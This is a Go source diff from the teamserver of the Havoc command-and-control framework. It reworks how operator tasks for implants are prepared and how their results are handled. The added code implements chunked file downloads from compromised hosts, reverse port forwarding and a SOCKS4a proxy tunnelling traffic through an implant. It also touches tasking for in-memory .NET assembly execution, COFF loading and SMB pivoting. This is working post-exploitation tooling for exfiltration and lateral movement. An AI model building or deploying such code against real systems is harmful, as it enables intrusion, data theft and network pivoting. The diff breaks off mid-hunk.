@@ -1,22 +1,26 @@
 package agent
 
 import (
-	"Havoc/pkg/common"
-	"Havoc/pkg/common/parser"
-	"Havoc/pkg/logger"
-	"Havoc/pkg/logr"
-	"Havoc/pkg/utils"
-	"Havoc/pkg/win32"
 	"bytes"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"math/rand"
+	"net"
 	"strconv"
 	"strings"
 	"time"
+
+	"Havoc/pkg/common"
+	"Havoc/pkg/common/parser"
+	"Havoc/pkg/logger"
+	"Havoc/pkg/logr"
+	"Havoc/pkg/socks"
+	"Havoc/pkg/utils"
+	"Havoc/pkg/win32"
 
 	"github.com/olekukonko/tablewriter"
 )
@@ -85,9 +89,9 @@ func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID strin
 	return nil
 }
 
-func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
+func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (*Job, error) {
 	var (
-		job = Job{
+		job = &Job{
 			Command: uint32(Command),
 			Data:    []interface{}{},
 			Created: time.Now().UTC().Format("02/01/2006 15:04:05"),
@@ -122,7 +126,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				Exit,
 			}
 		} else {
-			return Job{}, errors.New("ExitMethod not found")
+			return nil, errors.New("ExitMethod not found")
 		}
 
 		break
@@ -131,10 +135,24 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 		break
 
 	case COMMAND_SLEEP:
-		var SleepTime, _ = strconv.Atoi(Optional["Arguments"].(string))
+		var (
+			Delay int
+			err   error
+		)
 
-		job.Data = []interface{}{
-			SleepTime,
+		if val, ok := Optional["Arguments"]; ok {
+
+			Delay, err = strconv.Atoi(val.(string))
+			if err != nil {
+				return nil, err
+			}
+
+			job.Data = []interface{}{
+				Delay,
+			}
+
+		} else {
+			return nil, fmt.Errorf("no sleep delay specified: \"Arguments\" is not specified")
 		}
 
 	case COMMAND_FS:
@@ -175,7 +193,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
 				FileName = []byte(common.EncodeUTF16(string(val)))
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -194,15 +212,15 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			ArgArray = strings.Split(Arguments, ";")
 
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
-				FileName = []byte(common.EncodeUTF16(string(val)))
+				FileName = append([]byte(common.EncodeUTF16(string(val))), []byte{0, 0}...)
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[1]); err == nil {
-				Content = []byte(common.EncodeUTF16(string(val)))
+				Content = val
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			SubCommand = 3
@@ -250,13 +268,13 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				if val, err := base64.StdEncoding.DecodeString(Paths[0]); err == nil {
 					PathFrom = []byte(common.EncodeUTF16(string(val)))
 				} else {
-					return Job{}, err
+					return nil, err
 				}
 
 				if val, err := base64.StdEncoding.DecodeString(Paths[1]); err == nil {
 					PathTo = []byte(common.EncodeUTF16(string(val)))
 				} else {
-					return Job{}, err
+					return nil, err
 				}
 
 				job.Data = []interface{}{
@@ -288,7 +306,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
 				FileName = []byte(common.EncodeUTF16(string(val)))
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -321,6 +339,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			break
 
 		case 4:
+
 			var (
 				Args           = strings.Split(Arguments, ";")
 				Process        any
@@ -330,6 +349,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				ProcessVerbose int
 			)
 
+			// State, ProcessApp, Verbose, Piped, ProcessArg
 			if len(Args) > 4 {
 				ProcArgs, _ := base64.StdEncoding.DecodeString(Args[4])
 				ProcessArgs = string(ProcArgs)
@@ -432,7 +452,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			var pid, err = strconv.Atoi(Arguments)
 			if err != nil {
 				logger.Debug("proc::kill failed to parse pid: " + err.Error())
-				return Job{}, errors.New("proc::kill failed to parse pid: " + err.Error())
+				return nil, errors.New("proc::kill failed to parse pid: " + err.Error())
 			} else {
 				job.Data = []interface{}{
 					SubCommand,
@@ -485,21 +505,21 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 		if Arguments, ok := Optional["Arguments"].(string); ok {
 			if Parameters, err = base64.StdEncoding.DecodeString(Arguments); !ok {
-				return Job{}, errors.New("FunctionName not defined")
+				return nil, errors.New("FunctionName not defined")
 			}
 		} else {
-			return Job{}, errors.New("CoffeeLdr: Arguments not defined")
+			return nil, errors.New("CoffeeLdr: Arguments not defined")
 		}
 
 		if Binary, ok := Optional["Binary"].(string); ok {
 			if ObjectFile, err = base64.StdEncoding.DecodeString(Binary); err != nil {
 				logger.Debug("Failed to turn base64 encoded object file into bytes: " + err.Error())
-				return Job{}, err
+				return nil, err
 			}
 		}
 
 		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
-			return Job{}, errors.New("CoffeeLdr: FunctionName not defined")
+			return nil, errors.New("CoffeeLdr: FunctionName not defined")
 		}
 
 		if ObjectFlags, ok := Optional["Flags"].(string); ok {
@@ -522,7 +542,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			}
 
 		} else {
-			return Job{}, errors.New("CoffeeLdr: Flags not defined")
+			return nil, errors.New("CoffeeLdr: Flags not defined")
 		}
 
 		job.Data = []interface{}{
@@ -538,10 +558,10 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
 		var (
 			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
-			arguments        = Optional["Arguments"].(string)
-			NetVersion       = "v4.0.30319"
+			arguments        = common.EncodeUTF16(Optional["Arguments"].(string))
+			NetVersion       = common.EncodeUTF16("v4.0.30319")
 			PipePath         = common.EncodeUTF16("\\\\.\\pipe\\mojo." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999999999999)) + strconv.Itoa(rand.Intn(9999999)))
-			AppDomainName    = "DefaultDomain"
+			AppDomainName    = common.EncodeUTF16("DefaultDomain")
 		)
 
 		job.Data = []interface{}{
@@ -1096,16 +1116,16 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			NetCommand, err = strconv.Atoi(val.(string))
 			if err != nil {
 				logger.Debug("Failed to parse net command: " + err.Error())
-				return Job{}, err
+				return nil, err
 			}
 		} else {
-			return Job{}, errors.New("command::net NetCommand not defined")
+			return nil, errors.New("command::net NetCommand not defined")
 		}
 
 		if val, ok := Optional["Param"]; ok {
 			Param = val.(string)
 		} else {
-			return Job{}, errors.New("command::net param not defined")
+			return nil, errors.New("command::net param not defined")
 		}
 
 		switch NetCommand {
@@ -1198,7 +1218,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 			if val, err := strconv.Atoi(val.(string)); err != nil {
 				logger.Debug("failed to convert pivot command to int: " + err.Error())
-				return Job{}, errors.New("failed to convert pivot command to int: " + err.Error())
+				return nil, errors.New("failed to convert pivot command to int: " + err.Error())
 			} else {
 				PivotCommand = val
 			}
@@ -1211,7 +1231,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				PivotCommand,
 			}
 
-		case DEMON_PIVOT_SMB_CONNECT:
+		case AGENT_PIVOT_SMB_CONNECT:
 			job.Data = []interface{}{
 				PivotCommand,
 				common.EncodeUTF16(Param),
@@ -1219,10 +1239,10 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 			break
 
-		case DEMON_PIVOT_SMB_DISCONNECT:
+		case AGENT_PIVOT_SMB_DISCONNECT:
 			var AgentID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1231,11 +1251,456 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			}
 			break
 
-		case DEMON_PIVOT_SMB_COMMAND:
+		case AGENT_PIVOT_SMB_COMMAND:
 			job.Data = []interface{}{
 				PivotCommand,
 			}
 			break
+		}
+
+		break
+
+	case COMMAND_TRANSFER:
+		var (
+			SubCommand string
+			Param      string
+			FileID     int64
+		)
+
+		if val, ok := Optional["Command"]; ok {
+			SubCommand = val.(string)
+		} else {
+			return job, errors.New("transfer field Command is empty.")
+		}
+
+		if val, ok := Optional["FileID"]; ok {
+			Param = val.(string)
+		} else {
+			return job, errors.New("transfer field FileID is empty.")
+		}
+
+		switch SubCommand {
+		case "list":
+			job.Data = []interface{}{
+				0x0,
+			}
+			break
+
+		case "stop":
+			FileID, err = strconv.ParseInt(Param, 16, 32)
+			if err != nil {
+				return nil, err
+			}
+
+			job.Data = []interface{}{
+				0x1,
+				FileID,
+			}
+			break
+
+		case "resume":
+			FileID, err = strconv.ParseInt(Param, 16, 32)
+			if err != nil {
+				return nil, err
+			}
+
+			job.Data = []interface{}{
+				0x2,
+				FileID,
+			}
+			break
+
+		case "remove":
+			FileID, err = strconv.ParseInt(Param, 16, 32)
+			if err != nil {
+				return nil, err
+			}
+
+			job.Data = []interface{}{
+				0x3,
+				FileID,
+			}
+			break
+		}
+
+		break
+
+	case COMMAND_SOCKET:
+		var (
+			SubCommand string
+			Param      string
+		)
+
+		if val, ok := Optional["Command"]; ok {
+			SubCommand = val.(string)
+		} else {
+			return job, errors.New("socket field Command is empty")
+		}
+
+		if val, ok := Optional["Params"]; ok {
+			Param = val.(string)
+		} else {
+			return job, errors.New("socket field param is empty")
+		}
+
+		switch SubCommand {
+		case "rportfwd add":
+			var (
+				Params  []string
+				LclAddr = 0
+				LclPort = 0
+				FwdAddr = 0
+				FwdPort = 0
+			)
+
+			/* LclAddr; LclPort; FwdAddr; FwdPort */
+			Params = strings.Split(Param, ";")
+			if len(Param) < 4 {
+				return nil, fmt.Errorf("rportfwd requieres 4 arguments, received %d", len(Params))
+			}
+
+			/* Parse local host & port arguments */
+			LclAddr, err = common.IpStringToInt32(Params[0])
+			if err != nil {
+				return nil, err
+			}
+
+			LclPort, err = strconv.Atoi(Params[1])
+			if err != nil {
+				return nil, err
+			}
+
+			/* Parse forward host & port arguments */
+			FwdAddr, err = common.IpStringToInt32(Params[2])
+			if err != nil {
+				return nil, err
+			}
+
+			FwdPort, err = strconv.Atoi(Params[3])
+			if err != nil {
+				return nil, err
+			}
+
+			job.Data = []interface{}{
+				SOCKET_COMMAND_RPORTFWD_ADD,
+				LclAddr,
+				LclPort,
+				FwdAddr,
+				FwdPort,
+			}
+
+			break
+
+		case "rportfwd list":
+			job.Data = []interface{}{
+				SOCKET_COMMAND_RPORTFWD_LIST,
+			}
+
+			break
+
+		case "rportfwd remove":
+			var SocketID int
+
+			SocketID, err = strconv.Atoi(Param)
+			if err != nil {
+				return nil, err
+			}
+
+			job.Data = []interface{}{
+				SOCKET_COMMAND_RPORTFWD_REMOVE,
+				SocketID,
+			}
+			break
+
+		case "rportfwd clear":
+			job.Data = []interface{}{
+				SOCKET_COMMAND_RPORTFWD_CLEAR,
+			}
+			break
+
+		case "socks add":
+
+			var Socks *socks.Socks
+
+			Socks = socks.NewSocks("0.0.0.0:" + Param)
+			if Socks == nil {
+				return nil, errors.New("failed to create a new socks4a instance")
+			}
+
+			Socks.SetHandler(func(s *socks.Socks, conn net.Conn) {
+
+				var (
+					ConnectJob  Job
+					SocksHeader socks.SocksHeader
+					err         error
+					SocketId    int32
+				)
+
+				SocksHeader, err = socks.ReadSocksHeader(conn)
+				if err != nil {
+					if err != io.EOF {
+						logger.Error("Failed to read socks header: " + err.Error())
+						return
+					}
+				}
+
+				/* generate some random socket id */
+				SocketId = rand.Int31n(0x10000)
+
+				s.Clients = append(s.Clients, SocketId)
+
+				a.SocksClientAdd(SocketId, conn)
+
+				/* now parse the host:port and send it to the agent. */
+				ConnectJob = Job{
+					Command: COMMAND_SOCKET,
+					Data: []any{
+						SOCKET_COMMAND_CONNECT,
+						SocketId,
+						SocksHeader.Port,
+						SocksHeader.IP,
+						SocksHeader.Domain,
+					},
+				}
+
+				a.AddJobToQueue(ConnectJob)
+
+				/* goroutine to read from socks proxy socket and send it to the agent */
+				go func(SocketId int) {
+
+					for {
+
+						/* check if the connection is still up */
+						if client := a.SocksClientGet(SocketId); client != nil {
+
+							if !client.Connected {
+								/* if we are still not connected then skip */
+								continue
+							}
+
+							if Data, err := a.SocksClientRead(SocketId); err == nil {
+
+								/* only send the data if there is something... */
+								if len(Data) > 0 {
+
+									/* make a new job */
+									var job = Job{
+										Command: COMMAND_SOCKET,
+										Data: []any{
+											SOCKET_COMMAND_READ_WRITE,
+											client.SocketID,
+											Data,
+										},
+									}
+
+									/* append the job to the task queue */
+									a.AddJobToQueue(job)
+
+								}
+
+							} else {
+
+								if err != io.EOF {
+
+									/* we failed to read from the socks proxy */
+									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", client.SocketID, err))
+
+									a.SocksClientClose(SocketId)
+
+									/* make a new job */
+									var job = Job{
+										Command: COMMAND_SOCKET,
+										Data: []any{
+											SOCKET_COMMAND_CLOSE,
+											client.SocketID,
+										},
+									}
+
+									/* append the job to the task queue */
+									a.AddJobToQueue(job)
+
+								}
+
+								break
+							}
+
+						} else {
+							/* seems like it has been removed. let's exit this routine */
+
+							break
+						}
+
+					}
+
+				}(int(SocketId))
+
+			})
+
+			/* TODO: append the socket to a list/array now */
+			a.SocksSvr = append(a.SocksSvr, &SocksServer{
+				Server: Socks,
+				Addr:   Param,
+			})
+
+			go func() {
+				err := Socks.Start()
+				if err != nil {
+					Socks.Failed = true
+					if Message != nil {
+						*Message = map[string]string{
+							"Type":    "Error",
+							"Message": fmt.Sprintf("Failed to start socks proxy: %v", err),
+							"Output":  "",
+						}
+					}
+					return
+				}
+			}()
+
+			if Message != nil {
+				if !Socks.Failed {
+
+					*Message = map[string]string{
+						"Type":    "Good",
+						"Message": fmt.Sprintf("Started socks4a server on port %v", Param),
+						"Output":  "",
+					}
+				}
+			}
+
+			return nil, nil
+
+		case "socks list":
+
+			var Output string
+
+			Output += fmt.Sprintf("\n")
+			Output += fmt.Sprintf(" Port \n")
+			Output += fmt.Sprintf(" ---- \n")
+
+			for _, server := range a.SocksSvr {
+
+				Output += fmt.Sprintf(" %s \n", server.Addr)
+
+			}
+
+			if Message != nil {
+				*Message = map[string]string{
+					"Type":    "Info",
+					"Message": "Socks proxy server: ",
+					"Output":  Output,
+				}
+			}
+
+			return nil, nil
+
+		case "socks kill":
+
+			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
+			var found = false
+
+			for i := range a.SocksSvr {
+
+				if a.SocksSvr[i].Addr == Param {
+
+					/* alright we found it */
+					found = true
+
+					/* close the server */
+					a.SocksSvr[i].Server.Close()
+
+					/* close every connection that the agent has with this socks proxy */
+					for client := range a.SocksSvr[i].Server.Clients {
+
+						/* close the client connection */
+						a.SocksClientClose(client)
+
+						/* make a new job */
+						var job = Job{
+							Command: COMMAND_SOCKET,
+							Data: []any{
+								SOCKET_COMMAND_CLOSE,
+								client,
+							},
+						}
+
+						/* append the job to the task queue */
+						a.AddJobToQueue(job)
+
+					}
+
+					/* remove the socks server from the array */
+					a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
+
+					break
+				}
+
+			}
+
+			if found {
+
+				if Message != nil {
+					*Message = map[string]string{
+						"Type":    "Info",
+						"Message": "Closed socks proxy " + Param,
+					}
+				}
+
+			} else {
+
+				if Message != nil {
+					*Message = map[string]string{
+						"Type":    "Info",
+						"Message": "Failed to find and close socks proxy " + Param,
+					}
+				}
+
+			}
+
+			return nil, nil
+
+		case "socks clear":
+
+			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
+
+			for i := range a.SocksSvr {
+
+				/* close the server */
+				a.SocksSvr[i].Server.Close()
+
+				/* close every connection that the agent has with this socks proxy */
+				for client := range a.SocksSvr[i].Server.Clients {
+
+					/* close the client connection */
+					a.SocksClientClose(client)
+
+					/* make a new job */
+					var job = Job{
+						Command: COMMAND_SOCKET,
+						Data: []any{
+							SOCKET_COMMAND_CLOSE,
+							client,
+						},
+					}
+
+					/* append the job to the task queue */
+					a.AddJobToQueue(job)
+
+				}
+
+				/* remove the socks server from the array */
+				a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
+
+			}
+
+			if Message != nil {
+				*Message = map[string]string{
+					"Type":    "Info",
+					"Message": "Successfully closed all socks proxies " + Param,
+				}
+			}
+
+			return nil, nil
 		}
 
 		break
@@ -1247,14 +1712,17 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 	return job, nil
 }
 
-func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs RoutineFunc) {
+func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver TeamServer) {
 	Parser.DecryptBuffer(a.Encryption.AESKey, a.Encryption.AESIv)
 
-	a.UpdateLastCallback(Funcs)
+	logger.Debug("Task Output: \n" + hex.Dump(Parser.Buffer()))
+
+	a.UpdateLastCallback(teamserver)
 
 	switch CommandID {
 
 	case COMMAND_GET_JOB:
+		/* this is most likely never going to reach. but just in case... */
 		break
 
 	case COMMAND_EXIT:
@@ -1273,9 +1741,9 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			}
 
 			a.Active = false
-			Funcs.EventAgentMark(a.NameID, "Dead")
+			teamserver.EventAgentMark(a.NameID, "Dead")
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 		}
 
 	case COMMAND_CHECKIN:
@@ -1320,7 +1788,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))
 
 			if Parser.Length() >= 4 {
-				Hostname = string(Parser.ParseBytes())
+				Hostname = common.StripNull(string(Parser.ParseBytes()))
 			} else {
 				Message["Type"] = "Info"
 				Message["Message"] = "Failed to parse agent request"
@@ -1328,7 +1796,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			}
 
 			if Parser.Length() >= 4 {
-				Username = string(Parser.ParseBytes())
+				Username = common.StripNull(string(Parser.ParseBytes()))
 			} else {
 				Message["Type"] = "Info"
 				Message["Message"] = "Failed to parse agent request"
@@ -1336,7 +1804,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			}
 
 			if Parser.Length() >= 4 {
-				DomainName = string(Parser.ParseBytes())
+				DomainName = common.StripNull(string(Parser.ParseBytes()))
 			} else {
 				Message["Type"] = "Info"
 				Message["Message"] = "Failed to parse agent request"
@@ -1344,14 +1812,14 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			}
 
 			if Parser.Length() >= 4 {
-				InternalIP = string(Parser.ParseBytes())
+				InternalIP = common.StripNull(string(Parser.ParseBytes()))
 			} else {
 				Message["Type"] = "Info"
 				Message["Message"] = "Failed to parse agent request"
 				goto SendMessage
 			}
 
-			ProcessName = string(Parser.ParseBytes())
+			ProcessName = common.StripNull(string(Parser.ParseBytes()))
 			ProcessPID = Parser.ParseInt32()
 			ProcessPPID = Parser.ParseInt32()
 			ProcessArch = Parser.ParseInt32()
@@ -1399,34 +1867,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 			}
 
-			// update this (use from meterpreter)
-			if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] != 0x0000001 && OsVersion[4] == 21996 {
-				Session.Info.OSVersion = "Windows 11 Server"
-			} else if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] == 0x0000001 && OsVersion[4] == 21996 {
-				Session.Info.OSVersion = "Windows 11"
-			} else if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] != 0x0000001 {
-				Session.Info.OSVersion = "Windows 10 Server"
-			} else if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] == 0x0000001 {
-				Session.Info.OSVersion = "Windows 10"
-			} else if OsVersion[0] == 6 && OsVersion[1] >= 3 && OsVersion[2] != 0x0000001 {
-				Session.Info.OSVersion = "Windows Server 2012 R2"
-			} else if OsVersion[0] == 6 && OsVersion[1] >= 3 && OsVersion[2] == 0x0000001 {
-				Session.Info.OSVersion = "Windows 8.1"
-			} else if OsVersion[0] == 6 && OsVersion[1] >= 2 && OsVersion[2] != 0x0000001 {
-				Session.Info.OSVersion = "Windows Server 2012"
-			} else if OsVersion[0] == 6 && OsVersion[1] >= 2 && OsVersion[2] == 0x0000001 {
-				Session.Info.OSVersion = "Windows 8"
-			} else if OsVersion[0] == 6 && OsVersion[1] >= 1 && OsVersion[2] != 0x0000001 {
-				Session.Info.OSVersion = "Windows Server 2008 R2"
-			} else if OsVersion[0] == 6 && OsVersion[1] >= 1 && OsVersion[2] == 0x0000001 {
-				Session.Info.OSVersion = "Windows 7"
-			} else if OsVersion[0] < 5 {
-				Session.Info.OSVersion = "unknown"
-			}
-
-			if OsVersion[3] != 0 {
-				Session.Info.OSVersion = Session.Info.OSVersion + " Service Pack " + strconv.Itoa(OsVersion[3])
-			}
+			Session.Info.OSVersion = getWindowsVersionString(OsVersion)
 
 			switch OsArch {
 			case 0:
@@ -1528,7 +1969,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		}
 
 	SendMessage:
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -1601,7 +2042,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			break
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 		break
 
 	case COMMAND_SLEEP:
@@ -1612,7 +2053,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		Output["Type"] = "Good"
 		Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds", a.Info.SleepDelay)
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 		break
 
@@ -1727,7 +2168,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 				break
 			}
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 			break
 		}
 
@@ -1756,8 +2197,8 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 				if !Explorer {
 					Dir += "\n"
-					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %-8s\n", "Size", "Type", "Last Modified      ", "Name")
-					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %-8s\n", "----", "----", "-------------------", "----")
+					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "Size", "Type", "Last Modified      ", "Name")
+					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "----", "----", "-------------------", "----")
 				}
 
 				for Parser.Length() >= 4 {
@@ -1812,7 +2253,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 					Output["Message"] = fmt.Sprintf("List Directory: %v", common.DecodeUTF16(Path))
 					Output["Output"] = Dir
 				} else {
-					DirMap["Path"] = Path
+					DirMap["Path"] = []byte(common.DecodeUTF16(Path))
 					DirMap["Files"] = DirArr
 
 					DirJson, err := json.Marshal(DirMap)
@@ -1830,26 +2271,106 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 			break
 
+		/* Download */
 		case 2:
+
+			/*
+			 * Download Header:
+			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
+			 *  [ File ID   ] Download File ID
+			 *
+			 * Data (Open):
+			 *  [ File Size ]
+			 *  [ File Name ]
+			 *
+			 * Data (Write)
+			 *  [ Chunk Data ] Size + FileChunk
+			 *
+			 * Data (Close):
+			 *  [ File Name ]
+			 *  [  Reason   ] Removed or Finished
+			 * */
 
 			if Parser.Length() >= 8 {
 				var (
-					FileName    = common.DecodeUTF16(Parser.ParseBytes())
-					FileContent = Parser.ParseBytes()
+					Mode   = Parser.ParseInt32()
+					FileID = Parser.ParseInt32()
 				)
-				Output["Type"] = "Info"
-				Output["Message"] = fmt.Sprintf("Downloaded file: %v (%v)", FileName, len(FileContent))
 
-				logr.LogrInstance.DemonAddDownloadedFile(a.NameID, FileName, FileContent)
+				switch Mode {
 
-				// TODO: instead of sending it directly to the client. get it from the Agent Download folder.
-				Output["MiscType"] = "download"
-				Output["MiscData"] = base64.StdEncoding.EncodeToString(FileContent)
-				Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + common.ByteCountSI(int64(len(FileContent)))
+				/* File Open */
+				case 0x0:
+					logger.Debug(fmt.Sprintf("Download open FileID:[%x]", FileID))
 
+					if Parser.Length() >= 8 {
+						var (
+							FileSize = Parser.ParseInt32()
+							FileName = common.DecodeUTF16(Parser.ParseBytes())
+							Size     = common.ByteCountSI(int64(FileSize))
+						)
+
+						Output["Type"] = "Info"
+						Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, Size)
+
+						if err := a.DownloadAdd(FileID, FileName, FileSize); err != nil {
+							Output["Type"] = "Error"
+							Output["Message"] = err.Error()
+						} else {
+							Output["MiscType"] = "download"
+							Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + Size
+						}
+					}
+
+					break
+
+				case 0x1:
+					logger.Debug(fmt.Sprintf("Download write FileID:[%v]", FileID))
+
+					if Parser.Length() >= 4 {
+						var FileChunk = Parser.ParseBytes()
+
+						a.DownloadWrite(FileID, FileChunk)
+					}
+
+					break
+
+				case 0x2:
+					logger.Debug(fmt.Sprintf("Download close FileID:[%v]", FileID))
+
+					if Parser.Length() >= 4 {
+						var (
+							FileName string
+							Reason   = Parser.ParseInt32()
+						)
+
+						if len(a.Downloads) > 0 {
+							var download = a.DownloadGet(FileID)
+							if download != nil {
+								FileName = download.FilePath
+							}
+
+							if Reason == 0x0 {
+								Output["Type"] = "Good"
+								Output["Message"] = fmt.Sprintf("Finished download of file: %v", FileName)
+
+								a.DownloadClose(FileID)
+							} else if Reason == 0x1 {
+								Output["Type"] = "Info"
+								Output["Message"] = fmt.Sprintf("Download has been removed: %v", FileName)
+
+								a.DownloadClose(FileID)
+							}
+						} else {
+							/* TODO: handle this error. or simply ignore this ? */
+						}
+
+					}
+
+					break
+				}
 			} else {
-				Output["Type"] = "Error"
-				Output["Message"] = "Failed to parse FS::Download response"
+				logger.Debug("Parser.Length() < 8")
 			}
 
 			break
@@ -1863,7 +2384,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 				)
 
 				Output["Type"] = "Info"
-				Output["Message"] = fmt.Sprintf("Uploaded file: %v (%v)", string(FileName), FileSize)
+				Output["Message"] = fmt.Sprintf("Uploaded file: %v (%v)", utils.UTF16BytesToString(FileName), FileSize)
 			} else {
 				Output["Type"] = "Error"
 				Output["Message"] = "Failed to parse FS::Upload response"
@@ -1945,7 +2466,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			}
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 		break
 
@@ -2029,7 +2550,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			Output["MiscData"] = base64.StdEncoding.EncodeToString(ProcessListJson)
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 	case COMMAND_OUTPUT:
 		var Output = make(map[string]string)
@@ -2038,7 +2559,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		Output["Output"] = string(Parser.ParseBytes())
 		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 	case CALLBACK_OUTPUT_OEM:
 		var Output = make(map[string]string)
@@ -2047,7 +2568,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		Output["Output"] = common.DecodeUTF16(Parser.ParseBytes())
